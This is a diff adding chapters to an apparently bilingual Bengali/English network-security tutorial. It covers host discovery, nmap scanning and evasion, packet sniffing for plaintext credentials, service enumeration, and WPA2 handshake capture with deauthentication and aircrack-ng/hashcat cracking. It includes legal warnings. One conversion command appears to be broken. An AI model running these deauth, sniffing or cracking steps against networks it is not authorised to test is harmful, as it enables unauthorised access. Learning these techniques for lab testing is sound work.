+    </div>
+  </div>
+</div>
+
+<!-- CH 2: NETWORK DISCOVERY -->
+<div class="chapter ch2">
+  <div class="chapter-header" data-num="02">
+    <div class="ch-label">CHAPTER 02</div>
+    <div class="ch-title">🔦 <span class="bn-text">Network Discovery — Live Hosts খোঁজা</span><span class="en-text">Network Discovery — Finding Live Hosts</span></div>
+    <div class="ch-desc"><span class="bn-text">Network-এ কোন কোন device চলছে সেটা বের করার কৌশল</span><span class="en-text">Techniques for finding which devices are active on the network</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">ICMP Ping — সবচেয়ে সরল</span><span class="en-text">ICMP Ping — The Simplest Method</span></h2>
+    <div class="code">
+<span class="c"># Single host ping</span>
+<span class="p">$</span> ping 192.168.1.1
+<span class="p">$</span> ping -c 4 192.168.1.1        <span class="c"># 4 packet পাঠাও</span>
+<span class="p">$</span> ping -i 0.2 192.168.1.1      <span class="c"># Fast ping</span>
+
+<span class="c"># Ping sweep — bash loop দিয়ে</span>
+<span class="p">$</span> for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "bytes from" & done
+
+<span class="c"># fping — একসাথে অনেক host</span>
+<span class="p">$</span> fping -a -g 192.168.1.0/24 2>/dev/null   <span class="c"># alive hosts শুধু</span>
+<span class="p">$</span> fping -a -g 10.0.0.0/24 -r 1            <span class="c"># 1 retry</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">ARP Scan — Local Network-এ সবচেয়ে নির্ভরযোগ্য</span><span class="en-text">ARP Scan — Most Reliable on Local Network</span></h2>
+    <div class="code">
+<span class="c"># arp-scan</span>
+<span class="p">$</span> arp-scan --localnet
+<span class="p">$</span> arp-scan -I eth0 192.168.1.0/24
+<span class="p">$</span> arp-scan --localnet | grep -v "DUP\|Unknown"
+
+<span class="c"># netdiscover</span>
+<span class="p">$</span> netdiscover -r 192.168.1.0/24
+<span class="p">$</span> netdiscover -i eth0 -r 192.168.1.0/24 -P   <span class="c"># Passive mode</span>
+
+<span class="c"># arping</span>
+<span class="p">$</span> arping -c 3 192.168.1.1
+
+<span class="c"># Nmap দিয়ে host discovery (no port scan)</span>
+<span class="p">$</span> nmap -sn 192.168.1.0/24          <span class="c"># Ping scan only</span>
+<span class="p">$</span> nmap -sn -PR 192.168.1.0/24      <span class="c"># ARP ping</span>
+<span class="p">$</span> nmap -sP 192.168.1.0/24          <span class="c"># Same as -sn (older syntax)</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Network Information Gathering</span><span class="en-text">Network Information Gathering</span></h2>
+    <div class="code">
+<span class="c"># DNS Lookup</span>
+<span class="p">$</span> nslookup target.com
+<span class="p">$</span> dig target.com A
+<span class="p">$</span> dig target.com MX
+<span class="p">$</span> dig -x 192.168.1.1            <span class="c"># Reverse DNS</span>
+<span class="p">$</span> host target.com
+
+<span class="c"># Traceroute — network path দেখা</span>
+<span class="p">$</span> traceroute target.com
+<span class="p">$</span> traceroute -T target.com      <span class="c"># TCP traceroute</span>
+<span class="p">$</span> mtr target.com               <span class="c"># Live traceroute</span>
+
+<span class="c"># Network interfaces</span>
+<span class="p">$</span> ip link show
+<span class="p">$</span> ifconfig -a
+<span class="p">$</span> ip neigh show                 <span class="c"># ARP cache (neighbors)</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH 3: NMAP -->
+<div class="chapter ch3">
+  <div class="chapter-header" data-num="03">
+    <div class="ch-label">CHAPTER 03</div>
+    <div class="ch-title">🗺️ Nmap — <span class="bn-text">সম্পূর্ণ গাইড</span><span class="en-text">Complete Guide</span></div>
+    <div class="ch-desc"><span class="bn-text">Network Mapper — পৃথিবীর সবচেয়ে বেশি ব্যবহৃত port scanner, সম্পূর্ণ বিস্তারিত</span><span class="en-text">Network Mapper — the world's most widely used port scanner, in complete detail</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Nmap Scan Types</span><span class="en-text">Nmap Scan Types</span></h2>
+    <table>
+      <thead><tr><th>Flag</th><th><span class="bn-text">Scan Type</span><span class="en-text">Scan Type</span></th><th><span class="bn-text">কীভাবে কাজ করে</span><span class="en-text">How it Works</span></th><th><span class="bn-text">কখন ব্যবহার করবে</span><span class="en-text">When to Use</span></th></tr></thead>
+      <tbody>
+        <tr><td><code>-sS</code></td><td>SYN Stealth</td><td><span class="bn-text">SYN পাঠায়, SYN-ACK পেলে RST পাঠায়</span><span class="en-text">Sends SYN, sends RST on SYN-ACK</span></td><td><span class="badge badge-g">DEFAULT (root)</span></td></tr>
+        <tr><td><code>-sT</code></td><td>TCP Connect</td><td><span class="bn-text">Full 3-way handshake</span><span class="en-text">Full 3-way handshake</span></td><td><span class="badge badge-b">Non-root user</span></td></tr>
+        <tr><td><code>-sU</code></td><td>UDP Scan</td><td><span class="bn-text">UDP packet পাঠায়</span><span class="en-text">Sends UDP packets</span></td><td><span class="badge badge-y">DNS, SNMP, DHCP</span></td></tr>
+        <tr><td><code>-sA</code></td><td>ACK Scan</td><td><span class="bn-text">Firewall rules detect করে</span><span class="en-text">Detects firewall rules</span></td><td><span class="badge badge-p">Firewall mapping</span></td></tr>
+        <tr><td><code>-sN</code></td><td>NULL Scan</td><td><span class="bn-text">কোনো flag নেই</span><span class="en-text">No flags set</span></td><td><span class="badge badge-b">IDS evasion</span></td></tr>
+        <tr><td><code>-sn</code></td><td>Ping Scan</td><td><span class="bn-text">Port scan ছাড়া host discovery</span><span class="en-text">Host discovery without port scan</span></td><td><span class="badge badge-g">Quick discovery</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">Nmap সম্পূর্ণ ব্যবহার</span><span class="en-text">Nmap Complete Usage</span></h2>
+    <div class="code">
+<span class="c"># ── TARGET SPECIFICATION ──</span>
+<span class="p">$</span> nmap 192.168.1.1                    <span class="c"># Single IP</span>
+<span class="p">$</span> nmap 192.168.1.1-254                <span class="c"># IP range</span>
+<span class="p">$</span> nmap 192.168.1.0/24                 <span class="c"># CIDR</span>
+<span class="p">$</span> nmap -iL targets.txt                <span class="c"># File থেকে</span>
+<span class="p">$</span> nmap target.com                     <span class="c"># Domain</span>
+
+<span class="c"># ── PORT SPECIFICATION ──</span>
+<span class="p">$</span> nmap -p 80 IP                       <span class="c"># Single port</span>
+<span class="p">$</span> nmap -p 80,443,8080 IP              <span class="c"># Multiple ports</span>
+<span class="p">$</span> nmap -p 1-1000 IP                   <span class="c"># Port range</span>
+<span class="p">$</span> nmap -p- IP                         <span class="c"># All 65535 ports</span>
+<span class="p">$</span> nmap --top-ports 100 IP             <span class="c"># Top 100 common ports</span>
+
+<span class="c"># ── SERVICE & OS DETECTION ──</span>
+<span class="p">$</span> nmap -sV IP                         <span class="c"># Service version</span>
+<span class="p">$</span> nmap -sV --version-intensity 9 IP   <span class="c"># Aggressive version</span>
+<span class="p">$</span> nmap -O IP                          <span class="c"># OS detection</span>
+<span class="p">$</span> nmap -A IP                          <span class="c"># All: OS+Version+Scripts+Traceroute</span>
+
+<span class="c"># ── TIMING TEMPLATES ──</span>
+<span class="p">$</span> nmap -T0 IP    <span class="c"># Paranoid (IDS evasion)</span>
+<span class="p">$</span> nmap -T1 IP    <span class="c"># Sneaky</span>
+<span class="p">$</span> nmap -T2 IP    <span class="c"># Polite</span>
+<span class="p">$</span> nmap -T3 IP    <span class="c"># Normal (default)</span>
+<span class="p">$</span> nmap -T4 IP    <span class="c"># Aggressive (fast)</span>
+<span class="p">$</span> nmap -T5 IP    <span class="c"># Insane (fastest)</span>
+
+<span class="c"># ── OUTPUT ──</span>
+<span class="p">$</span> nmap -oN output.txt IP   <span class="c"># Normal text</span>
+<span class="p">$</span> nmap -oX output.xml IP   <span class="c"># XML</span>
+<span class="p">$</span> nmap -oG output.gnmap IP <span class="c"># Grepable</span>
+<span class="p">$</span> nmap -oA output IP       <span class="c"># All 3 formats</span>
+<span class="p">$</span> nmap -v IP               <span class="c"># Verbose</span>
+<span class="p">$</span> nmap -vv IP              <span class="c"># More verbose</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">NSE Scripts — সবচেয়ে শক্তিশালী Feature</span><span class="en-text">NSE Scripts — The Most Powerful Feature</span></h2>
+    <div class="code">
+<span class="c"># Script Categories</span>
+<span class="p">$</span> nmap --script vuln IP              <span class="c"># Vulnerability scan</span>
+<span class="p">$</span> nmap --script safe IP              <span class="c"># Safe scripts</span>
+<span class="p">$</span> nmap --script default IP           <span class="c"># Default scripts</span>
+<span class="p">$</span> nmap --script discovery IP         <span class="c"># Discovery</span>
+
+<span class="c"># Specific scripts</span>
+<span class="p">$</span> nmap --script http-enum IP         <span class="c"># Web directory enum</span>
+<span class="p">$</span> nmap --script http-title IP        <span class="c"># Web page title</span>
+<span class="p">$</span> nmap --script smb-vuln-* IP        <span class="c"># SMB vulnerabilities</span>
+<span class="p">$</span> nmap --script smb-enum-shares IP   <span class="c"># SMB shares</span>
+<span class="p">$</span> nmap --script ftp-anon IP          <span class="c"># Anonymous FTP</span>
+<span class="p">$</span> nmap --script ssh-hostkey IP       <span class="c"># SSH host key</span>
+<span class="p">$</span> nmap --script dns-zone-transfer IP <span class="c"># DNS zone transfer</span>
+<span class="p">$</span> nmap --script ssl-cert IP          <span class="c"># SSL certificate info</span>
+<span class="p">$</span> nmap --script banner IP            <span class="c"># Service banners</span>
+
+<span class="c"># Evasion techniques</span>
+<span class="p">$</span> nmap -D RND:10 IP                  <span class="c"># Decoy scan</span>
+<span class="p">$</span> nmap -f IP                         <span class="c"># Fragment packets</span>
+<span class="p">$</span> nmap --source-port 53 IP           <span class="c"># Source port spoof</span>
+<span class="p">$</span> nmap --data-length 200 IP          <span class="c"># Random data</span>
+<span class="p">$</span> nmap --randomize-hosts IP          <span class="c"># Random order</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Practical Scan Examples</span><span class="en-text">Practical Scan Examples</span></h2>
+    <div class="code">
+<span class="c"># Quick network survey</span>
+<span class="p">$</span> nmap -sn 192.168.1.0/24 -oN hosts.txt
+
+<span class="c"># Comprehensive single target scan</span>
+<span class="p">$</span> nmap -sV -sC -O -p- --min-rate=1000 -T4 TARGET_IP -oA full_scan
+
+<span class="c"># Fast top ports scan</span>
+<span class="p">$</span> nmap -sV --top-ports 1000 -T4 TARGET_IP
+
+<span class="c"># Vulnerability assessment</span>
+<span class="p">$</span> nmap -sV --script vuln TARGET_IP
+
+<span class="c"># EternalBlue check (MS17-010)</span>
+<span class="p">$</span> nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
+
+<span class="c"># Web application discovery</span>
+<span class="p">$</span> nmap -p 80,443,8080,8443 --script http-enum,http-title,http-methods TARGET_IP
+    </div>
+  </div>
+</div>
+
+<!-- CH 4: PACKET ANALYSIS -->
+<div class="chapter ch4">
+  <div class="chapter-header" data-num="04">
+    <div class="ch-label">CHAPTER 04</div>
+    <div class="ch-title">📦 <span class="bn-text">Packet Capture ও Analysis</span><span class="en-text">Packet Capture & Analysis</span></div>
+    <div class="ch-desc"><span class="bn-text">tcpdump ও Wireshark দিয়ে network traffic দেখা ও বিশ্লেষণ করা</span><span class="en-text">Viewing and analyzing network traffic with tcpdump and Wireshark</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">tcpdump — Command Line Packet Capture</span><span class="en-text">tcpdump — Command Line Packet Capture</span></h2>
+    <div class="code">
+<span class="c"># Basic capture</span>
+<span class="p">$</span> tcpdump -i eth0                      <span class="c"># eth0 এ capture</span>
+<span class="p">$</span> tcpdump -i any                       <span class="c"># সব interface</span>
+<span class="p">$</span> tcpdump -i eth0 -w capture.pcap      <span class="c"># File-এ save</span>
+<span class="p">$</span> tcpdump -r capture.pcap              <span class="c"># File পড়া</span>
+<span class="p">$</span> tcpdump -i eth0 -c 100               <span class="c"># 100 packet capture</span>
+<span class="p">$</span> tcpdump -i eth0 -n                   <span class="c"># No DNS resolution</span>
+
+<span class="c"># Filters</span>
+<span class="p">$</span> tcpdump -i eth0 host 192.168.1.1     <span class="c"># Specific IP</span>
+<span class="p">$</span> tcpdump -i eth0 port 80              <span class="c"># Specific port</span>
+<span class="p">$</span> tcpdump -i eth0 tcp                  <span class="c"># TCP only</span>
+<span class="p">$</span> tcpdump -i eth0 udp                  <span class="c"># UDP only</span>
+<span class="p">$</span> tcpdump -i eth0 icmp                 <span class="c"># ICMP only</span>
+<span class="p">$</span> tcpdump -i eth0 'port 80 and host 192.168.1.1'
+
+<span class="c"># Security-specific captures</span>
+<span class="p">$</span> tcpdump -i eth0 -A port 80           <span class="c"># HTTP content (ASCII)</span>
+<span class="p">$</span> tcpdump -i eth0 -A 'port 21'        <span class="c"># FTP credentials!</span>
+<span class="p">$</span> tcpdump -i eth0 -A 'port 23'        <span class="c"># Telnet credentials!</span>
+<span class="p">$</span> tcpdump -i eth0 'tcp[tcpflags] = tcp-syn'  <span class="c"># SYN scan detect</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Wireshark — GUI Packet Analyzer</span><span class="en-text">Wireshark — GUI Packet Analyzer</span></h2>
+    <div class="code">
+<span class="c"># Wireshark Display Filters (GUI-তে Filter bar-এ লিখবে)</span>
+
+<span class="c"># Protocol filters</span>
+http                              <span class="c"># HTTP traffic</span>
+dns                               <span class="c"># DNS queries</span>
+ftp                               <span class="c"># FTP</span>
+ssh                               <span class="c"># SSH</span>
+tcp                               <span class="c"># All TCP</span>
+udp                               <span class="c"># All UDP</span>
+icmp                              <span class="c"># ICMP/Ping</span>
+arp                               <span class="c"># ARP packets</span>
+
+<span class="c"># IP filters</span>
+ip.addr == 192.168.1.1            <span class="c"># Specific IP</span>
+ip.src == 192.168.1.100           <span class="c"># Source IP</span>
+ip.dst == 192.168.1.1             <span class="c"># Destination IP</span>
+
+<span class="c"># Port filters</span>
+tcp.port == 80                    <span class="c"># TCP port 80</span>
+tcp.dstport == 443                <span class="c"># HTTPS</span>
+tcp.flags.syn == 1                <span class="c"># SYN packets</span>
+tcp.flags.reset == 1              <span class="c"># RST (closed port)</span>
+
+<span class="c"># Content filters</span>
+http.request.method == "POST"     <span class="c"># POST requests</span>
+http contains "password"          <span class="c"># Password in HTTP</span>
+dns.qry.name contains "google"   <span class="c"># DNS query</span>
+
+<span class="c"># Combined</span>
+http.request and ip.src == 192.168.1.5
+tcp.port == 80 and ip.addr == 10.0.0.1
+    </div>
+
+    <div class="box info">
+      <div class="box-t">💡 <span class="bn-text">Wireshark দিয়ে Credential খোঁজা</span><span class="en-text">Finding Credentials with Wireshark</span></div>
+      <p><span class="bn-text">HTTP, FTP, Telnet-এ credentials plaintext-এ পাঠানো হয়। Wireshark-এ <code>http.request.method == "POST"</code> filter দিলে login form submissions দেখা যায়। এটাই দেখায় কেন HTTPS, SFTP ও SSH ব্যবহার করা উচিত।</span><span class="en-text">HTTP, FTP, and Telnet send credentials in plaintext. Using the filter <code>http.request.method == "POST"</code> in Wireshark reveals login form submissions. This is exactly why you should use HTTPS, SFTP, and SSH.</span></p>
+    </div>
+  </div>
+</div>
+
+<!-- CH 5: SERVICE ENUMERATION -->
+<div class="chapter ch5">
+  <div class="chapter-header" data-num="05">
+    <div class="ch-label">CHAPTER 05</div>
+    <div class="ch-title">🔎 <span class="bn-text">Service Enumeration</span><span class="en-text">Service Enumeration</span></div>
+    <div class="ch-desc"><span class="bn-text">Open port খোঁজার পর — প্রতিটা service থেকে কীভাবে তথ্য বের করতে হয়</span><span class="en-text">After finding open ports — how to extract information from each service</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">SMB Enumeration (Port 445)</span><span class="en-text">SMB Enumeration (Port 445)</span></h2>
+    <div class="code">
+<span class="p">$</span> enum4linux -a TARGET_IP
+<span class="p">$</span> enum4linux-ng -A TARGET_IP
+
+<span class="p">$</span> smbclient -L //TARGET_IP -N          <span class="c"># Share list (anonymous)</span>
+<span class="p">$</span> smbclient -L //TARGET_IP -U user     <span class="c"># With credentials</span>
+<span class="p">$</span> smbclient //TARGET_IP/share -N       <span class="c"># Connect to share</span>
+
+<span class="p">$</span> smbmap -H TARGET_IP
+<span class="p">$</span> smbmap -H TARGET_IP -u user -p pass
+
+<span class="c"># Nmap SMB scripts</span>
+<span class="p">$</span> nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 TARGET_IP
+<span class="p">$</span> nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP   <span class="c"># EternalBlue</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">HTTP/HTTPS Enumeration (Port 80/443)</span><span class="en-text">HTTP/HTTPS Enumeration (Port 80/443)</span></h2>
+    <div class="code">
+<span class="c"># Technology detection</span>
+<span class="p">$</span> whatweb http://TARGET_IP
+<span class="p">$</span> wafw00f http://TARGET_IP             <span class="c"># WAF detection</span>
+<span class="p">$</span> curl -I http://TARGET_IP             <span class="c"># HTTP headers</span>
+
+<span class="c"># Directory brute force</span>
+<span class="p">$</span> gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
+<span class="p">$</span> gobuster dir -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+<span class="p">$</span> ffuf -w wordlist.txt -u http://TARGET_IP/FUZZ -mc 200,301,302
+
+<span class="c"># Web vulnerability scanner</span>
+<span class="p">$</span> nikto -h http://TARGET_IP
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SSH, FTP, SNMP Enumeration</span><span class="en-text">SSH, FTP, SNMP Enumeration</span></h2>
+    <div class="code">
+<span class="c"># SSH (Port 22)</span>
+<span class="p">$</span> ssh-audit TARGET_IP                  <span class="c"># Algorithm & weakness check</span>
+<span class="p">$</span> nmap --script ssh-hostkey -p 22 TARGET_IP
+
+<span class="c"># FTP (Port 21) — Anonymous login check</span>
+<span class="p">$</span> ftp TARGET_IP
+<span class="c"># Username: anonymous, Password: (blank or email)</span>
+<span class="p">$</span> nmap --script ftp-anon,ftp-bounce -p 21 TARGET_IP
+
+<span class="c"># SNMP (Port 161/UDP)</span>
+<span class="p">$</span> snmpwalk -c public -v1 TARGET_IP
+<span class="p">$</span> snmpwalk -c public -v2c TARGET_IP
+<span class="p">$</span> onesixtyone -c community.txt TARGET_IP
+<span class="p">$</span> nmap -sU -p 161 --script snmp-info TARGET_IP
+    </div>
+  </div>
+</div>
+
+<!-- CH 6: WIFI PROTOCOLS -->
+<div class="chapter ch6">
+  <div class="chapter-header" data-num="06">
+    <div class="ch-label">CHAPTER 06</div>
+    <div class="ch-title">📶 <span class="bn-text">WiFi Protocol ও Security Standards</span><span class="en-text">WiFi Protocol & Security Standards</span></div>
+    <div class="ch-desc"><span class="bn-text">802.11, WEP, WPA, WPA2, WPA3 — WiFi কীভাবে কাজ করে এবং কোনটায় কী দুর্বলতা</span><span class="en-text">802.11, WEP, WPA, WPA2, WPA3 — how WiFi works and what vulnerabilities each has</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">WiFi Security Evolution</span><span class="en-text">WiFi Security Evolution</span></h2>
+    <table>
+      <thead><tr><th>Standard</th><th><span class="bn-text">বছর</span><span class="en-text">Year</span></th><th>Encryption</th><th><span class="bn-text">নিরাপত্তা</span><span class="en-text">Security</span></th><th><span class="bn-text">দুর্বলতা</span><span class="en-text">Vulnerability</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>WEP</strong></td><td>1997</td><td>RC4</td><td><span class="badge badge-r">BROKEN</span></td><td><span class="bn-text">মিনিটে crack হয়</span><span class="en-text">Cracked in minutes</span></td></tr>
+        <tr><td><strong>WPA</strong></td><td>2003</td><td>TKIP</td><td><span class="badge badge-r">WEAK</span></td><td>TKIP vulnerabilities</td></tr>
+        <tr><td><strong>WPA2</strong></td><td>2004</td><td>AES-CCMP</td><td><span class="badge badge-y">MEDIUM</span></td><td><span class="bn-text">Weak password, PMKID, KRACK</span><span class="en-text">Weak password, PMKID, KRACK</span></td></tr>
+        <tr><td><strong>WPA3</strong></td><td>2018</td><td>SAE (Dragonfly)</td><td><span class="badge badge-g">STRONG</span></td><td>DragonBlood (patched)</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">WPA2 Authentication — কীভাবে কাজ করে?</span><span class="en-text">WPA2 Authentication — How Does It Work?</span></h2>
+    <div class="netdiag">
+<span class="bn-text">WPA2 4-Way Handshake:</span><span class="en-text">WPA2 4-Way Handshake:</span>
+
+Client (Station)                    Access Point (AP)
+    │                                       │
+    │◄──── Message 1: ANonce ───────────────│
+    │      (AP sends random number)         │
+    │                                       │
+    │──── Message 2: SNonce + MIC ─────────►│
+    │     (Client sends its random + hash)  │
+    │                                       │
+    │◄──── Message 3: GTK + MIC ────────────│
+    │      (AP confirms session key)        │
+    │                                       │
+    │──── Message 4: ACK ──────────────────►│
+    │     (Client confirms)                 │
+    │                                       │
+    └══════ Encrypted Communication ════════┘
+
+<span class="nd-r">Attacker:</span> Message 2 ধরলেই offline crack করা যায়!
+<span class="nd-y">Password hash = PBKDF2(password, SSID, 4096 iterations)</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">WiFi Bands ও Channel</span><span class="en-text">WiFi Bands & Channels</span></h2>
+    <div class="grid2">
+      <div class="card b-card">
+        <h4>2.4 GHz Band</h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Channel 1, 6, 11 — overlap নেই</span><span class="en-text">Channels 1, 6, 11 — no overlap</span></li>
+          <li><span class="bn-text">Range বেশি কিন্তু slow</span><span class="en-text">Longer range but slower</span></li>
+          <li><span class="bn-text">Wall ভেদ করতে পারে</span><span class="en-text">Can penetrate walls</span></li>
+          <li>802.11b/g/n</li>
+        </ul>
+      </div>
+      <div class="card g-card">
+        <h4>5 GHz Band</h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">২৩টি non-overlapping channel</span><span class="en-text">23 non-overlapping channels</span></li>
+          <li><span class="bn-text">দ্রুত কিন্তু range কম</span><span class="en-text">Faster but shorter range</span></li>
+          <li><span class="bn-text">কম interference</span><span class="en-text">Less interference</span></li>
+          <li>802.11a/n/ac/ax</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CH 7: WIFI RECON -->
+<div class="chapter ch7">
+  <div class="chapter-header" data-num="07">
+    <div class="ch-label">CHAPTER 07</div>
+    <div class="ch-title">🔭 <span class="bn-text">WiFi Reconnaissance</span><span class="en-text">WiFi Reconnaissance</span></div>
+    <div class="ch-desc"><span class="bn-text">Monitor mode, airodump-ng দিয়ে wireless network scanning — সব কিছু দেখার কৌশল</span><span class="en-text">Wireless network scanning with monitor mode and airodump-ng — techniques for seeing everything</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box danger">
+      <div class="box-t">⚖️ <span class="bn-text">আইনগত সতর্কতা</span><span class="en-text">Legal Warning</span></div>
+      <p><span class="bn-text">WiFi scanning শুধুমাত্র <strong>নিজের network</strong> বা <strong>লিখিত অনুমতি</strong> নিয়ে করতে হবে। অন্যের WiFi-তে unauthorized access বাংলাদেশের Digital Security Act এবং আন্তর্জাতিক আইনে অপরাধ। সব practice নিজের home lab বা dedicated test network-এ করো।</span><span class="en-text">WiFi scanning must only be done on <strong>your own network</strong> or with <strong>written permission</strong>. Unauthorized access to others' WiFi is a crime under Bangladesh's Digital Security Act and international law. Do all practice in your own home lab or a dedicated test network.</span></p>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Monitor Mode চালু করা</span><span class="en-text">Enabling Monitor Mode</span></h2>
+    <div class="code">
+<span class="c"># Compatible adapter check</span>
+<span class="p">$</span> iwconfig                              <span class="c"># Wireless interfaces দেখো</span>
+<span class="p">$</span> iw list | grep "Supported interface modes" -A 10   <span class="c"># Monitor mode support</span>
+
+<span class="c"># Method 1: airmon-ng (recommended)</span>
+<span class="p">$</span> airmon-ng check kill                  <span class="c"># Interfering processes বন্ধ</span>
+<span class="p">$</span> airmon-ng start wlan0                 <span class="c"># Monitor mode চালু</span>
+<span class="c"># Interface: wlan0 → wlan0mon</span>
+<span class="p">$</span> airmon-ng stop wlan0mon               <span class="c"># Monitor mode বন্ধ</span>
+
+<span class="c"># Method 2: iw command</span>
+<span class="p">$</span> ip link set wlan0 down
+<span class="p">$</span> iw dev wlan0 set type monitor
+<span class="p">$</span> ip link set wlan0 up
+
+<span class="c"># Verify monitor mode</span>
+<span class="p">$</span> iwconfig wlan0mon
+    </div>
+
+    <h2 class="sec"><span class="bn-text">airodump-ng — Wireless Network Scanner</span><span class="en-text">airodump-ng — Wireless Network Scanner</span></h2>
+    <div class="code">
+<span class="c"># Basic scan — সব নেটওয়ার্ক দেখো</span>
+<span class="p">$</span> airodump-ng wlan0mon
+
+<span class="c"># Output explanation:</span>
+<span class="c"># BSSID     = AP-এর MAC address</span>
+<span class="c"># PWR       = Signal strength (higher = closer)</span>
+<span class="c"># Beacons   = Broadcast count</span>
+<span class="c"># #Data     = Data frames</span>
+<span class="c"># CH        = Channel</span>
+<span class="c"># ENC       = Encryption type</span>
+<span class="c"># CIPHER    = Cipher (CCMP, TKIP)</span>
+<span class="c"># AUTH      = Authentication (PSK, MGT)</span>
+<span class="c"># ESSID     = Network name</span>
+
+<span class="c"># Specific network focus</span>
+<span class="p">$</span> airodump-ng wlan0mon --bssid AP_MAC --channel 6
+
+<span class="c"># Capture packets to file</span>
+<span class="p">$</span> airodump-ng wlan0mon --bssid AP_MAC --channel 6 -w capture
+
+<span class="c"># 5 GHz band</span>
+<span class="p">$</span> airodump-ng wlan0mon --band a
+<span class="p">$</span> airodump-ng wlan0mon --band abg  <span class="c"># Both bands</span>
+
+<span class="c"># Kismet — Advanced wireless scanner</span>
+<span class="p">$</span> kismet -c wlan0mon
+    </div>
+  </div>
+</div>
+
+<!-- CH 8: WPA2 CAPTURE & CRACK -->
+<div class="chapter ch8">
+  <div class="chapter-header" data-num="08">
+    <div class="ch-label">CHAPTER 08</div>
+    <div class="ch-title">🔐 <span class="bn-text">WPA2 Handshake Capture ও Crack</span><span class="en-text">WPA2 Handshake Capture & Crack</span></div>
+    <div class="ch-desc"><span class="bn-text">নিজের WPA2 network-এর password strength test করা — authorized testing only</span><span class="en-text">Testing the password strength of your own WPA2 network — authorized testing only</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box danger">
+      <div class="box-t">⚠️ <span class="bn-text">শুধুমাত্র নিজের নেটওয়ার্কে!</span><span class="en-text">Your Own Network Only!</span></div>
+      <p><span class="bn-text">এই chapter-এর সব কিছু শুধুমাত্র <strong>নিজের WiFi</strong> বা dedicated lab-এ test করার জন্য। এটা দেখায় কেন তোমার router-এ strong password রাখা দরকার।</span><span class="en-text">Everything in this chapter is only for testing <strong>your own WiFi</strong> or a dedicated lab. It shows why you need a strong password on your router.</span></p>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Handshake Capture করা</span><span class="en-text">Capturing the Handshake</span></h2>
+    <div class="code">
+<span class="c"># Step 1: Monitor mode চালু</span>
+<span class="p">$</span> airmon-ng check kill
+<span class="p">$</span> airmon-ng start wlan0
+
+<span class="c"># Step 2: Target network খোঁজো</span>
+<span class="p">$</span> airodump-ng wlan0mon
+<span class="c"># Note: BSSID (AP MAC), Channel, ESSID</span>
+
+<span class="c"># Step 3: Specific channel-এ capture শুরু করো</span>
+<span class="p">$</span> airodump-ng --bssid TARGET_BSSID --channel TARGET_CH -w handshake wlan0mon
+
+<span class="c"># Step 4: (অন্য terminal-এ) Deauth — client reconnect করাও</span>
+<span class="p">$</span> aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon
+<span class="c"># -deauth 10 = 10 deauth packet পাঠাও</span>
+<span class="c"># উপরের window-এ "WPA handshake: XX:XX:XX" দেখালে success!</span>
+
+<span class="c"># Handshake verify করা</span>
+<span class="p">$</span> aircrack-ng handshake-01.cap
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Aircrack-ng দিয়ে Crack করা</span><span class="en-text">Cracking with Aircrack-ng</span></h2>
+    <div class="code">
+<span class="c"># Dictionary attack</span>
+<span class="p">$</span> aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
+<span class="p">$</span> aircrack-ng handshake-01.cap -w custom_wordlist.txt -e ESSID
+
+<span class="c"># Hashcat দিয়ে (অনেক দ্রুত — GPU ব্যবহার করে)</span>
+<span class="c"># Step 1: .cap → .hc22000 convert</span>
+<span class="p">$</span> hcxtools handshake-01.cap -o hash.hc22000
+<span class="c"># অথবা:</span>
+<span class="p">$</span> hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+
+<span class="c"># Step 2: Hashcat crack</span>
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  <span class="c"># 8-digit numbers</span>
+
+<span class="c"># PMKID Attack (client ছাড়াই!)</span>
+<span class="p">$</span> hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2
+<span class="p">$</span> hcxpcapngtool pmkid.pcapng -o hash.hc22000
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">Password কতক্ষণে crack হয়?</span><span class="en-text">How Long Does It Take to Crack a Password?</span> //</h3>
+      <ul>
+        <li>🔴 <span class="bn-text">"password", "12345678", "bangladesh" → মিনিটের মধ্যে</span><span class="en-text">"password", "12345678", "bangladesh" → within minutes</span></li>
